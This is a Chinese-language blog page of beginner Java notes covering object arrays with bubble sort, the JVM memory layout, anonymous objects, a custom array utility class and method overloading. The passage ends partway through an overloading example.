<p>4.对象数组题目:<br>定义类Student, 包含三个属性:学号number(int), 年级state(int), 成绩<br>score(int)。创建20个学生对象， 学号为1到20，年级和成绩都由随机数确定。<br>问题一:打印出3年级(state值为3)的学生信息。<br>问题二: 使用冒泡排序按学生成绩排序，并遍历所有学生信息<br>提示:<br>1)生成随机数: Math.random(), 返回值类型double;<br>2)四舍五入取整: Math.round(double d)， 返回值类型long.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student[] stus = <span class="keyword">new</span> Student[<span class="number">20</span>]; <span class="comment">//对象数组,定义了数组，但是数组元素还没实例化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; stus.length;i++)&#123;</span><br><span class="line">            <span class="comment">//给数组元素赋值</span></span><br><span class="line">            stus[i] = <span class="keyword">new</span> Student();</span><br><span class="line">            <span class="comment">//给student对象的属性赋值</span></span><br><span class="line">            stus[i].number = i+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//年级：[1,6]</span></span><br><span class="line">            stus[i].state = (<span class="keyword">int</span>)(Math.random()*<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//成绩[0,100]</span></span><br><span class="line">            stus[i].score = (<span class="keyword">int</span>)(Math.random()*(<span class="number">100</span>-<span class="number">0</span>+<span class="number">1</span>)+<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            System.out.println(stus[i].info());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line">        <span class="comment">//问题一</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stus[i].state==<span class="number">3</span>)&#123;</span><br><span class="line">                System.out.println(stus[i].info());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line">        <span class="comment">// 问题二</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i&lt; stus.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt; stus.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(stus[j].score&gt;stus[j+<span class="number">1</span>].score)&#123;</span><br><span class="line">                    <span class="comment">//如果需要换序，交换的是数组的元素: Student对象!!</span></span><br><span class="line">                    Student temp = <span class="keyword">new</span> Student();</span><br><span class="line">                    temp = stus[j+<span class="number">1</span>];</span><br><span class="line">                    stus[j+<span class="number">1</span>]= stus[j];</span><br><span class="line">                    stus[j] = temp;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            System.out.println(stus[i].info());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number; <span class="comment">//学号</span></span><br><span class="line">    <span class="keyword">int</span> state; <span class="comment">//年级</span></span><br><span class="line">    <span class="keyword">int</span> score; <span class="comment">//成绩</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;学号：&quot;</span>+number + <span class="string">&quot;,年级: &quot;</span> + state+ <span class="string">&quot;,成绩：&quot;</span>+ score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改进：此代码是对StudentTest . java（上面）的改进:将操作数组的功能封装到方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student[] stus = <span class="keyword">new</span> Student[<span class="number">20</span>]; <span class="comment">//对象数组,定义了数组，但是数组元素还没实例化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; stus.length;i++)&#123;</span><br><span class="line">            <span class="comment">//给数组元素赋值</span></span><br><span class="line">            stus[i] = <span class="keyword">new</span> Student();</span><br><span class="line">            <span class="comment">//给student对象的属性赋值</span></span><br><span class="line">            stus[i].number = i+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//年级：[1,6]</span></span><br><span class="line">            stus[i].state = (<span class="keyword">int</span>)(Math.random()*<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//成绩[0,100]</span></span><br><span class="line">            stus[i].score = (<span class="keyword">int</span>)(Math.random()*(<span class="number">100</span>-<span class="number">0</span>+<span class="number">1</span>)+<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        StudentTest test = <span class="keyword">new</span> StudentTest();</span><br><span class="line">        test.print(stus);</span><br><span class="line">        System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line">        <span class="comment">//问题一：</span></span><br><span class="line">        test.serachState(stus,<span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line">        <span class="comment">// 问题二</span></span><br><span class="line">        test.sort(stus);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span> 遍历数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stus</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(Student[] stus)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            System.out.println(stus[i].info());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span> 查找Student数组中指定年级的学生信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stus 要查找的数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> state 指定的年级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">serachState</span><span class="params">(Student[] stus,<span class="keyword">int</span> state)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stus[i].state==state)&#123;</span><br><span class="line">                System.out.println(stus[i].info());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span> 给Student数组排序，冒泡排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stus</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Student[] stus)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i&lt; stus.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt; stus.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(stus[j].score&gt;stus[j+<span class="number">1</span>].score)&#123;</span><br><span class="line">                    <span class="comment">//如果需要换序，交换的是数组的元素: Student对象!!</span></span><br><span class="line">                    Student temp = <span class="keyword">new</span> Student();</span><br><span class="line">                    temp = stus[j+<span class="number">1</span>];</span><br><span class="line">                    stus[j+<span class="number">1</span>]= stus[j];</span><br><span class="line">                    stus[j] = temp;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stus.length;i++)&#123;</span><br><span class="line">            System.out.println(stus[i].info());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number; <span class="comment">//学号</span></span><br><span class="line">    <span class="keyword">int</span> state; <span class="comment">//年级</span></span><br><span class="line">    <span class="keyword">int</span> score; <span class="comment">//成绩</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;学号：&quot;</span>+number + <span class="string">&quot;,年级: &quot;</span> + state+ <span class="string">&quot;,成绩：&quot;</span>+ score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JVM内存结构</p>
<p><img src="/2022/04/13/JAVA/image-20220428153030705.png" alt="image-20220428153030705"></p>
<p>虚拟机栈，即为平时提到的栈结构；我们将局部变量存储在栈结构中<br>堆，我们将new出来的结构(比如:数组、对象)加载在堆空间中。补充:对象的属性(非static的) 加载在堆空间中。<br>方法区:类的加载信息、常量池，静态域</p>
<p>一、理解“万事万物皆对象”<br>1.在Java语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构</p>
<blockquote>
<p>Scanner, String等<br>文件: File<br>网络资源: URL</p>
</blockquote>
<p>2.涉及到J ava语言与前端Html、后端的数据库交互时，前后端的结构在Java层面交互时，都体现为类、对象。</p>
<p>二、对象数组的内存解析</p>
<p>引用类型的变量，只可能存储两类值: null或 地址值（含变量类型）</p>
<p><img src="/2022/04/13/JAVA/image-20220428155452173.png" alt="image-20220428155452173"></p>
<p>三、匿名对象的使用</p>
<p>1.理解:我们创建的对象，没有显式的赋给一个变量名。 即为匿名对象<br>2.特征:匿名对象只能调用一次。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstanceTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Phone p = <span class="keyword">new</span> Phone();</span><br><span class="line">        p.sendEmail();</span><br><span class="line">        p.playGame();</span><br><span class="line">        <span class="comment">//匿名对象</span></span><br><span class="line">        <span class="keyword">new</span> Phone().sendEmail();</span><br><span class="line">        <span class="keyword">new</span> Phone().playGame();</span><br><span class="line">        <span class="keyword">new</span> Phone().price = <span class="number">1999</span>;</span><br><span class="line">        <span class="keyword">new</span> Phone().showPrice();  <span class="comment">// 0.0 新的phone</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Phone</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendEmail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发送邮件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">playGame</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;玩游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;手机价格为：&quot;</span>+price);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">发送邮件</span><br><span class="line">玩游戏</span><br><span class="line">发送邮件</span><br><span class="line">玩游戏</span><br><span class="line">手机价格为：<span class="number">0.0</span></span><br></pre></td></tr></table></figure>

<h4 id="自定义数组的工具类"><a href="#自定义数组的工具类" class="headerlink" title="自定义数组的工具类"></a>自定义数组的工具类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">自定义数组工具类</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求数组的最大值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maxValue&lt;arr[i])&#123;</span><br><span class="line">                maxValue=arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求数组的最小值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> minValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(minValue&gt;arr[i])&#123;</span><br><span class="line">                minValue=arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求数组的总和</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求数组的平均值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAvg</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> getSum(arr)/ arr.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反转数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp =arr[i];</span><br><span class="line">            arr[i]=arr[arr.length-<span class="number">1</span>-i];</span><br><span class="line">            arr[arr.length-<span class="number">1</span>-i]=temp;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 复制数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] copy(<span class="keyword">int</span>[] arr)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr1.length;i++)&#123;</span><br><span class="line">            arr1[i]=arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr1; <span class="comment">//返回的是int[] ,int型数组</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数组排序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length-<span class="number">1</span>;i++)&#123;   <span class="comment">//轮数,减一的原因是，最后一轮就是最后一个数据，不用比较</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt; arr.length-<span class="number">1</span>-i;j++)&#123; <span class="comment">//每一轮比较次数</span></span><br><span class="line">                <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp =arr[j];</span><br><span class="line">                    arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">                    arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 遍历数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找指定元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> dest)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dest==arr[i])&#123;  <span class="comment">//int型用==；String用equals</span></span><br><span class="line">                <span class="keyword">return</span> i; <span class="comment">//return可以结束方法，替代了原本的break</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>; <span class="comment">//返回负数，表示没有找到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h4><p><strong>重载的概念</strong></p>
<p>在同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型不同即可。<br>重载的特点:<br>与返回值类型无关，只看参数列表，且参数列表必须不同。(参数个数或参数类型。调用时，根据方法参数列表的不同来区别。<br>重载示例:<br>//返回两个整数的和<br>int add(int x,int y){return x+y;}<br>//返回三个整数的和<br>int add(int x,int y,int z){return x+y+z;}<br>//返回两个小数的和<br>double add(double x,double y){return x+y;}</p>
<p><strong>重载的细节说明</strong></p>
<p>两同一不同：同一个类，相同方法名；一不同：参数列表不同（个数或者类型不同）</p>
<p>判断是否是重载:<br>跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系!</p>
<p>在通过对象调用方法时，如何确定某一个指定的方法:<br>方法名—&gt;参数列表</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java1;</span><br><span class="line"><span class="comment">//方法的重载</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OverLoadTest</span> </span>&#123;</span><br><span class="line">    <span 